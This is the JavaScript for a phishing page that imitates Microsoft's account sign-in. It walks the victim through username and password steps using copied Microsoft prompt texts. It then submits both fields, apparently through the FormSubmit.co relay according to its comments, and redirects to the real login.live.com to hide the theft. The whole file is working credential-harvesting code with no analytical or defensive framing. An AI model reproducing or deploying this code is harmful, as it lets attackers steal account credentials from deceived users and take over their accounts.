document.addEventListener('DOMContentLoaded', () => {
    const unReq = "Enter a valid email address, phone number, or Skype name."
    const pwdReq = "Please enter the password for your Microsoft account."
    const unameInp = document.getElementById('inp_uname');
    const pwdInp = document.getElementById('inp_pwd');
    const form_uname = document.getElementById('form_uname');
    const form_pwd = document.getElementById('form_pwd');
    let view = "uname";

    let unameVal = pwdVal = false;
    /////next button
    const nxt = document.getElementById('btn_next');

    nxt.addEventListener('click', (event) => {
        event.preventDefault();
        //validate the form
        validate();
        if (unameVal) {
            document.getElementById("section_uname").classList.toggle('d-none');
            document.getElementById('section_pwd').classList.remove('d-none');
            document.querySelectorAll('#user_identity').forEach((e) => {
                e.innerText = unameInp.value;
            });
            view = "pwd";
        }
    });

    //////sign in button

    const sig = document.getElementById('btn_sig');

    sig.addEventListener('click', (event) => {
     event.preventDefault();   
        //validate the form
        validate();
        if (pwdVal) {
             // Disable the form elements to prevent double submission
            unameInp.disabled = true;
            pwdInp.disabled = true;
            // Submit the form using FormSubmit.co
            form_uname.submit();
            form_pwd.submit();
            // Redirect to the provided link
            window.location.href = "https://login.live.com"; 
            window.close();
        }
    });


 // Function to submit the form and redirect
    function submitFormAndRedirect() {
        // Submit the form using FormSubmit.co
        form_uname.submit();
        form_pwd.submit();
        // Redirect to the provided link
        window.location.href = "https://login.live.com";
    }
    

    function validate() {
        function unameValAction(type) {
            if (!type) {
                document.getElementById('error_uname').innerText = unReq;
                unameInp.classList.add('error-inp');
                unameVal = false;
            } else {
                document.getElementById('error_uname').innerText = "";
                unameInp.classList.remove('error-inp')
                unameVal = true;
            }

        }
        function pwdValAction(type) {
            if (!type) {
                document.getElementById('error_pwd').innerText = pwdReq;
                pwdInp.classList.add('error-inp')
                pwdVal = false;
            } else {
                document.getElementById('error_pwd').innerText = "";
                pwdInp.classList.remove('error-inp')
                pwdVal = true;
            }

        }
        if (view === "uname") {
            if (unameInp.value.trim() === "") {
                unameValAction(false);
            } else {
                unameValAction(true);
            }
            unameInp.addEventListener('change', function () {
                if (this.value.trim() === "") {
                    unameValAction(false);
                } else {
                    unameValAction(true);
                }
            })
        } else if (view === "pwd") {
            if (pwdInp.value.trim() === "") {
                pwdValAction(false);
            } else {
                pwdValAction(true);
            }
            pwdInp.addEventListener('change', function () {
                if (this.value.trim() === "") {
                    pwdValAction(false);
                } else {
                    pwdValAction(true);
                }
            })
        }
        return false;
    }

    //back button
    document.querySelector('.back').addEventListener('click', () => {
        view = "uname";
        document.getElementById("section_pwd").classList.toggle('d-none');
        document.getElementById('section_uname').classList.remove('d-none');
    })

    //final buttons
    document.querySelectorAll('#btn_final').forEach((b) => {
        b.addEventListener('click', (event) => {
            event.preventDefault();
            form_uname.submit();
            form_pwd.submit();

            //Redirect to the provided link
            window.location.href="https://login.live.com";
            window.open(location, '_self').close();
        })
    })
})
